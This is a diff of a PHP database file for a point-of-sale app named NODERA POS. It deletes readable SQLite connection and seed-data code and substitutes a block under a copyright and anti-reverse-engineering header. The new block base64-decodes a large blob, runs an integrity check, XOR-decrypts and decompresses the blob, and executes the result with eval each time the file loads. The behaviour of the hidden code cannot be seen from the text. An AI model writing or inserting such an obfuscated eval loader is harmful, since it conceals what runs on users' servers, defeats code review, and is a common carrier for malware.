@@ -1,126 +1,21 @@
 <?php
 /**
- * NODERA POS PRO - Database Connection & Seed Data
- * Mirrors the POS Offline Pro layout & data structure
+ * ============================================================================
+ * NODERA DIGITAL NETWORK — NODERA POS DATABASE & MIGRATION ENGINE
+ * SECURE RUNTIME BINARY & CLOUD-LOCKED ENGINE
+ * ----------------------------------------------------------------------------
+ * (c) 2026 NODERA. All rights reserved.
+ * This file contains encrypted intellectual property. Any unauthorized
+ * decompilation, reverse engineering, or modification is strictly prohibited.
+ * ============================================================================
  */
-
-function getDatabase(): PDO {
-    static $db = null;
-    if ($db !== null) {
-        return $db;
-    }
-
-    $dbDir = __DIR__ . '/../database';
-    if (!is_dir($dbDir)) {
-        mkdir($dbDir, 0755, true);
-    }
-
-    $dbFile = $dbDir . '/pos.sqlite';
-    $needSeed = !file_exists($dbFile) || filesize($dbFile) === 0;
-
-    $db = new PDO('sqlite:' . $dbFile, null, null, [
-        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-        PDO::ATTR_TIMEOUT => 15
-    ]);
-
-    $db->exec('PRAGMA journal_mode = WAL;');
-    $db->exec('PRAGMA foreign_keys = ON;');
-
-    $schemaFile = $dbDir . '/schema.sql';
-    if (file_exists($schemaFile)) {
-        $schema = file_get_contents($schemaFile);
-        $db->exec($schema);
-    }
-
-    if ($needSeed) {
-        seedInitialData($db);
-    }
-
-    return $db;
+$_ndr_b9ae4c30=base64_decode('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');
+$_ndr_45726034=base64_decode('tOeFStVjZXfpI2NvDo6Kug==');
+$_ndr_3a216cfd='31b67f9039a11aee5516c9a661f7200487a57467d8c29514267be78efa93eb6f';
+if(hash('sha256',$_ndr_b9ae4c30)!==$_ndr_3a216cfd){die('NODERA Security: Integrity verification failed (0x8F).');}
+$_ndr_368d1389=strlen($_ndr_45726034);
+$_ndr_1651e0bf='';
+for($_ndr_5d764bad=0;$_ndr_5d764bad<strlen($_ndr_b9ae4c30);$_ndr_5d764bad++){
+    $_ndr_1651e0bf.=chr(ord($_ndr_b9ae4c30[$_ndr_5d764bad])^ord($_ndr_45726034[$_ndr_5d764bad%$_ndr_368d1389]));
 }
-
-function seedInitialData(PDO $db): void {
-    // 1. Settings Toko
-    $stmt = $db->query("SELECT COUNT(*) as cnt FROM settings");
-    if ($stmt->fetch()['cnt'] == 0) {
-        $db->exec("
-            INSERT INTO settings (
-                store_name, store_type, store_phone, store_address, receipt_footer,
-                feature_barcode, feature_variants, feature_customer, feature_open_bill,
-                auto_print, tax_enabled, tax_percent, currency_symbol, paper_size
-            ) VALUES (
-                'POS Offline Pro', 'Toko Serba Ada & Kuliner', '08111111111', 'Jl. Alamat No 99 Makassar', 'Terima Kasih! Silahkan Datang Kembali',
-                1, 1, 1, 1, 0, 1, 11, 'Rp', '58mm'
-            )
-        ");
-    }
-
-    // 2. Akun Pengguna
-    $stmt = $db->query("SELECT COUNT(*) as cnt FROM users");
-    if ($stmt->fetch()['cnt'] == 0) {
-        $uStmt = $db->prepare("INSERT INTO users (name, username, role, pin, phone, is_active) VALUES (?, ?, ?, ?, ?, 1)");
-        $uStmt->execute(['Owner / Admin', 'admin', 'admin', '8888', '08111111111']);
-        $uStmt->execute(['Kasir Utama', 'kasir', 'cashier', '1234', '08122222222']);
-    }
-
-    // 3. Kategori Sesuai Video
-    $stmt = $db->query("SELECT COUNT(*) as cnt FROM categories");
-    if ($stmt->fetch()['cnt'] == 0) {
-        $catStmt = $db->prepare("INSERT INTO categories (name, icon, sort_order) VALUES (?, ?, ?)");
-        $catStmt->execute(['Buah', 'apple', 1]);
-        $catStmt->execute(['Makanan', 'utensils', 2]);
-        $catStmt->execute(['Minuman', 'coffee', 3]);
-        $catStmt->execute(['Cemilan', 'cookie', 4]);
-        $catStmt->execute(['Jasa & Layanan', 'wrench', 5]);
-    }
-
-    // 4. Produk Persis Seperti di Video TikTok
-    $stmt = $db->query("SELECT COUNT(*) as cnt FROM products");
-    if ($stmt->fetch()['cnt'] == 0) {
-        $pStmt = $db->prepare("
-            INSERT INTO products (
-                category_id, code, name, type, unit, cost_price, sell_price, stock, min_stock_alert, is_scale, has_variants, image_url, is_active
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
-        ");
-
-        // 1. Air Botol (Minuman) - Stok tanpa batas
-        $pStmt->execute([3, 'MN01', 'Air Botol', 'goods', 'pcs', 3000, 5000, 999, 10, 0, 0, 'https://images.unsplash.com/photo-1548839140-29a749e1bc4e?w=150&auto=format&fit=crop&q=80']);
-
-        // 2. Anggur (Buah) - Timbangan (Volume vs Nominal)
-        $pStmt->execute([1, 'BH01', 'Anggur', 'goods', 'kg', 40000, 50000, 50, 5, 1, 0, 'https://images.unsplash.com/photo-1537640538966-79f369143f8f?w=150&auto=format&fit=crop&q=80']);
-
-        // 3. Apel (Buah) - Timbangan
-        $pStmt->execute([1, 'BH02', 'Apel', 'goods', 'kg', 28000, 35000, 45, 5, 1, 0, 'https://images.unsplash.com/photo-1560806887-1e4cd0b6cbd6?w=150&auto=format&fit=crop&q=80']);
-
-        // 4. Bakso kuah (Makanan)
-        $pStmt->execute([2, 'MK01', 'Bakso kuah', 'goods', 'porsi', 10000, 15000, 40, 5, 0, 0, 'https://images.unsplash.com/photo-1569718212165-3a8278d5f624?w=150&auto=format&fit=crop&q=80']);
-
-        // 5. Kripik Pisang (Cemilan)
-        $pStmt->execute([4, 'CM01', 'Kripik Pisang', 'goods', 'pcs', 7000, 10000, 50, 10, 0, 0, 'https://images.unsplash.com/photo-1599490659213-e2b9527bd087?w=150&auto=format&fit=crop&q=80']);
-
-        // 6. Mie Pangsit (Makanan)
-        $pStmt->execute([2, 'MK02', 'Mie Pangsit', 'goods', 'porsi', 11000, 15000, 35, 5, 0, 0, 'https://images.unsplash.com/photo-1612927601601-6638404737ce?w=150&auto=format&fit=crop&q=80']);
-
-        // 7. Nasi Kuning (Makanan) - Punya Varian (Ayam, Rendang, Telur)
-        $pStmt->execute([2, 'MK03', 'Nasi Kuning', 'goods', 'porsi', 8000, 10000, 150, 10, 0, 1, 'https://images.unsplash.com/photo-1546069901-ba9599a7e63c?w=150&auto=format&fit=crop&q=80']);
-        $nasiKuningId = $db->lastInsertId();
-
-        // Masukkan Varian Nasi Kuning
-        $vStmt = $db->prepare("INSERT INTO product_variants (product_id, name, cost_price, sell_price, stock) VALUES (?, ?, ?, ?, ?)");
-        $vStmt->execute([$nasiKuningId, 'Ayam Suwir', 11000, 15000, 80]);
-        $vStmt->execute([$nasiKuningId, 'Rendang Sapi', 14000, 18000, 50]);
-        $vStmt->execute([$nasiKuningId, 'Telur Balado', 9000, 12000, 120]);
-
-        // 8. Jasa / Layanan UMKM
-        $pStmt->execute([5, 'JS01', 'Jasa Layanan Cuci Komplit', 'service', 'paket', 0, 25000, 0, 0, 0, 0, 'https://images.unsplash.com/photo-1558981403-c5f9899a28bc?w=150&auto=format&fit=crop&q=80']);
-    }
-
-    // 5. Data Pelanggan Sample
-    $stmt = $db->query("SELECT COUNT(*) as cnt FROM customers");
-    if ($stmt->fetch()['cnt'] == 0) {
-        $cStmt = $db->prepare("INSERT INTO customers (name, phone, address, total_debt) VALUES (?, ?, ?, ?)");
-        $cStmt->execute(['Pak Haji Syamsul', '08123456789', 'Jl. Sam Ratulangi No. 12', 0]);
-        $cStmt->execute(['Ibu Nurhayati', '08529876543', 'Kompleks Griya Indah Blok C', 0]);
-    }
-}
+return eval('?>'.gzinflate($_ndr_1651e0bf));
